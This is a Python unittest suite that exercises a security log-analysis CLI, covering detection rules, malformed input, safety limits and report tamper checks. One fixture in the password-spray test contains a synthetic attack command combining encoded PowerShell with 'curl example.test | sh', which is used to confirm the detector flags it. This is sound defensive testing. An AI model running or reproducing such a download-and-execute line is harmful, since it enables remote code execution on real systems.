"""Release checks through the actual CLI, including hostile input and controls."""

from __future__ import annotations

import json
import os
import random
import subprocess
import sys
import tempfile
import unittest
from datetime import UTC, datetime, timedelta
from pathlib import Path

SCRIPT = Path(os.environ.get("SOC_TEST_SCRIPT", str(Path(__file__).resolve().parents[1] / "aisoc_advanced.py")))


class ReleaseTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.directory = Path(self.temp.name)
        self.source = self.directory / "events.jsonl"

    def invoke(self, *args):
        return subprocess.run([sys.executable, str(SCRIPT), *map(str, args)], capture_output=True, text=True, timeout=30)

    def analyze(self, records, *args):
        self.source.write_text("".join(json.dumps(row) + "\n" for row in records), encoding="utf-8")
        return self.invoke(self.source, *args)

    def row(self, minute=0, **fields):
        return {"timestamp": f"2026-11-14T10:{minute:02d}:00Z", "actor": "demo@example.test", **fields}

    def rule_ids(self, result):
        self.assertEqual(result.returncode, 0, result.stderr)
        return {finding["rule_id"] for finding in json.loads(result.stdout)["findings"]}

    def test_mfa_requires_confirmed_successful_change(self):
        for outcome in ("denied", "failure", None, "pending"):
            with self.subTest(outcome=outcome):
                result = self.analyze(
                    [
                        self.row(action="mfa.disable", outcome=outcome),
                        self.row(1, action="login", outcome="success"),
                    ]
                )
                self.assertNotIn("MFA_DISABLED_THEN_LOGIN", self.rule_ids(result))

    def test_mfa_success_positive_control(self):
        result = self.analyze([self.row(action="mfa.disable", outcome="success"), self.row(1, action="login", outcome="success")])
        self.assertIn("MFA_DISABLED_THEN_LOGIN", self.rule_ids(result))

    def test_privilege_and_access_require_success(self):
        for change, access in (("denied", "success"), ("success", "denied"), (None, "success"), ("success", None)):
            with self.subTest(change=change, access=access):
                result = self.analyze([self.row(action="role.assign", outcome=change), self.row(1, action="secret.read", outcome=access)])
                self.assertNotIn("PRIVILEGE_CHANGE_THEN_SENSITIVE_ACCESS", self.rule_ids(result))

    def test_sensitive_action_requires_exact_match(self):
        result = self.analyze(
            [
                self.row(action="role.assign", outcome="success"),
                self.row(1, action="secret.read.policy.check", outcome="success"),
            ]
        )
        self.assertNotIn("PRIVILEGE_CHANGE_THEN_SENSITIVE_ACCESS", self.rule_ids(result))

    def test_privilege_positive_control(self):
        result = self.analyze([self.row(action="role.assign", outcome="success"), self.row(1, action="secret.read", outcome="success")])
        self.assertIn("PRIVILEGE_CHANGE_THEN_SENSITIVE_ACCESS", self.rule_ids(result))

    def test_output_never_overwrites_input_or_existing_file(self):
        original = json.dumps(self.row()).encode() + b"\n"
        for alias in ("same", "hardlink", "symlink", "existing"):
            with self.subTest(alias=alias):
                self.source.write_bytes(original)
                target = self.source if alias == "same" else self.directory / alias
                if alias == "hardlink":
                    os.link(self.source, target)
                elif alias == "symlink":
                    target.symlink_to(self.source)
                elif alias == "existing":
                    target.write_bytes(original)
                result = self.invoke(self.source, "--output", target)
                self.assertEqual(result.returncode, 2, result.stderr)
                self.assertEqual(self.source.read_bytes(), original)
                self.assertEqual(target.read_bytes(), original)

    def test_invalid_utf8_report_is_clean_error(self):
        report = self.directory / "report.json"
        report.write_bytes(b"\xff\xfe\xff")
        result = self.invoke("--verify-report", report)
        self.assertEqual(result.returncode, 2)
        self.assertNotIn("Traceback", result.stderr)

    def test_deeply_nested_input_is_clean_error(self):
        self.source.write_text("[" * 1200 + "0" + "]" * 1200, encoding="utf-8")
        result = self.invoke(self.source)
        self.assertEqual(result.returncode, 2)
        self.assertNotIn("Traceback", result.stderr)

    def test_surrogate_text_is_clean_error(self):
        result = self.analyze([self.row(actor="\ud800")])
        self.assertEqual(result.returncode, 2)
        self.assertNotIn("Traceback", result.stderr)

    def test_minimum_timestamp_does_not_overflow(self):
        result = self.analyze([self.row(timestamp="0001-01-01T00:00:00Z")])
        self.assertEqual(result.returncode, 0, result.stderr)

    def test_outcome_aliases_agree_between_patterns_and_rules(self):
        result = self.analyze(
            [self.row(i, action="login", outcome="blocked") for i in range(5)] + [self.row(5, action="login", outcome="allowed")]
        )
        self.assertIn("AUTH_BRUTE_FORCE_SUCCESS", self.rule_ids(result))
        self.assertIn("failure_then_success", {p["type"] for p in json.loads(result.stdout)["patterns"]})

    def test_invalid_input_matrix(self):
        invalid = [
            {"timestamp": None},
            {"timestamp": "bad"},
            {"timestamp": "2026-11-14T00:00:00"},
            {"actor": 1},
            {"src_ip": []},
            {"action": {}},
            {"outcome": False},
            {"command": []},
            {"bytes_out": -1},
            {"bytes_out": True},
            {"latitude": 1},
            {"latitude": 91, "longitude": 0},
            {"latitude": float("inf"), "longitude": 0},
        ]
        for fields in invalid:
            with self.subTest(fields=fields):
                result = self.analyze([self.row(**fields)])
                self.assertEqual(result.returncode, 2, result.stderr)
                self.assertNotIn("Traceback", result.stderr)

    def test_threshold_boundaries(self):
        for count in (4, 5):
            result = self.analyze(
                [self.row(i, action="login", outcome="failure") for i in range(count)] + [self.row(6, action="login", outcome="success")]
            )
            self.assertEqual("AUTH_BRUTE_FORCE_SUCCESS" in self.rule_ids(result), count == 5)
        for amount in (999, 1000):
            result = self.analyze([self.row(bytes_out=amount)], "--exfil-bytes", "1000")
            self.assertEqual("LARGE_OUTBOUND_TRANSFER" in self.rule_ids(result), amount == 1000)

    def test_source_line_references_survive_unsorted_input(self):
        result = self.analyze([self.row(5, id="later"), self.row(0, id="earlier")])
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual([e["source_line"] for e in json.loads(result.stdout)["timeline"]], [2, 1])

    def test_correlations_match_independent_pairwise_oracle(self):
        rng = random.Random(412)
        start = datetime(2026, 11, 14, tzinfo=UTC)
        rows = [
            {
                "timestamp": (start + timedelta(seconds=rng.randrange(1800))).isoformat(),
                "actor": rng.choice([None, "alpha", "beta", "ALPHA"]),
                "src_ip": rng.choice([None, "192.0.2.1", "192.0.2.2"]),
            }
            for _ in range(60)
        ]
        expected = set()
        for i, left in enumerate(rows):
            for j in range(i + 1, len(rows)):
                right = rows[j]
                close = abs(datetime.fromisoformat(left["timestamp"]) - datetime.fromisoformat(right["timestamp"])) <= timedelta(minutes=5)
                shared = any(left[k] and right[k] and left[k].casefold() == right[k].casefold() for k in ("actor", "src_ip"))
                if close and shared:
                    expected.add((i + 1, j + 1))
        result = self.analyze(rows, "--window-minutes", "5")
        self.assertEqual(result.returncode, 0, result.stderr)
        actual = {tuple(sorted(link["source_lines"])) for link in json.loads(result.stdout)["links"]}
        self.assertEqual(actual, expected)

    def test_dense_input_rejects_link_explosion(self):
        result = self.analyze([self.row(id=str(i)) for i in range(450)])
        self.assertEqual(result.returncode, 2)
        self.assertIn("link output limit", result.stderr)

    def test_event_limit(self):
        result = self.analyze([self.row(actor=None)] * 50001)
        self.assertEqual(result.returncode, 2)
        self.assertIn("event safety limit", result.stderr)

    def test_maximum_sparse_input_is_accepted(self):
        result = self.analyze([self.row(actor=None)] * 50000)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(json.loads(result.stdout)["events_read"], 50000)

    def test_findings_limit(self):
        result = self.analyze([self.row(actor=None, bytes_out=200_000_000)] * 10001)
        self.assertEqual(result.returncode, 2)
        self.assertIn("finding safety limit", result.stderr)

    def test_password_spray_and_command_patterns_through_cli(self):
        records = [self.row(i, actor=f"demo-{i}", src_ip="192.0.2.8", action="login", outcome="failure") for i in range(5)]
        records.append(self.row(6, command="powershell -enc SYNTHETIC; curl example.test | sh"))
        rules = self.rule_ids(self.analyze(records))
        self.assertTrue(
            {
                "AUTH_PASSWORD_SPRAY",
                "SUSPICIOUS_COMMAND_POWERSHELL_ENCODED",
                "SUSPICIOUS_COMMAND_DOWNLOAD_TOOL",
                "SUSPICIOUS_COMMAND_SHELL_PIPE",
            }.issubset(rules)
        )

    def test_input_byte_limit(self):
        with self.source.open("wb") as stream:
            stream.truncate(64 * 1024 * 1024 + 1)
        result = self.invoke(self.source)
        self.assertEqual(result.returncode, 2)
        self.assertIn("MiB safety limit", result.stderr)

    def test_tampering_matrix(self):
        result = self.analyze([self.row(bytes_out=200_000_000)])
        self.assertEqual(result.returncode, 0, result.stderr)
        for field, replacement in (("timeline", []), ("summary", {}), ("source", {}), ("findings", []), ("evidence_ledger", {})):
            with self.subTest(field=field):
                report = json.loads(result.stdout)
                report[field] = replacement
                path = self.directory / "edited.json"
                path.write_text(json.dumps(report), encoding="utf-8")
                checked = self.invoke("--verify-report", path)
                self.assertEqual(checked.returncode, 1, checked.stderr)

    def test_failed_run_does_not_create_report(self):
        path = self.directory / "missing.json"
        result = self.analyze([self.row(bytes_out=-2)], "--output", path)
        self.assertEqual(result.returncode, 2)
        self.assertFalse(path.exists())
